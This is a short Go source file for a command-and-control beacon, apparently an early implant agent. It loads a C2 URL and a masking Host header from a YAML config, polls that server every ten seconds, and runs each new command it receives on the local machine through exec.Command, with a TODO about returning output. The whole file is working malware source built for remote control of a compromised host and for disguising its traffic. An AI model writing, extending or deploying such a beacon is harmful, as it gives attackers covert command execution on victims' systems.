package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/bt/discover-agent/common/file"
	"gopkg.in/yaml.v2"
)

// Path to config file.
const configFile = "config.yml"

var lastCmdId = ""

type config struct {
	C2Link   string `yaml:"c2_link"`
	HostMask string `yaml:"host_mask"`
}

func main() {
	cfg, err := loadConfig()
	if err != nil {
		fmt.Errorf("could not read in config: %s", err)
		return
	}

	client := http.Client{
		Timeout: time.Second * 1,
	}
	req, err := makeRequest(cfg)
	if err != nil {
		fmt.Errorf("could not make HTTP request: %s", err)
		return
	}

	for {
		resp, err := client.Do(req)
		if err != nil {
			fmt.Errorf("error sending request to server: %s", err)
			continue
		}

		respData, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Errorf("error reading response: %s", err)
			continue
		}

		parseCommand(string(respData))
		time.Sleep(time.Second * 10)
	}
}

func parseCommand(data string) {
	data = strings.TrimSpace(data)
	cmdDataSplit := strings.SplitN(data, "|", 2)

	cmdId := cmdDataSplit[0]
	cmd := cmdDataSplit[1]

	if lastCmdId != cmdId {
		lastCmdId = cmdId
		c := exec.Command(cmd)
		//cmdSplit := strings.SplitN(cmd, " ", 2)
		//
		//var args = ""
		//if len(cmdSplit) > 1 {
		//	args = cmdSplit[1]
		//}
		//
		//fmt.Printf("exec: %s %s\n", cmdSplit[0], args)
		//c := exec.Command(cmdSplit[0], args)
		c.Start()

		// TODO: Send output back to the server somewhere
	}
}

func makeRequest(cfg config) (*http.Request, error) {
	req, err := http.NewRequest("GET", cfg.C2Link, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Host", cfg.HostMask)
	return req, nil
}

func loadConfig() (config, error) {
	f, err := file.ReadOpen(configFile)
	if err != nil {
		return config{}, err
	}

	cfgData, err := ioutil.ReadAll(f)
	if err != nil {
		return config{}, err
	}

	cfg := config{}
	err = yaml.Unmarshal(cfgData, &cfg)

	return cfg, err
}
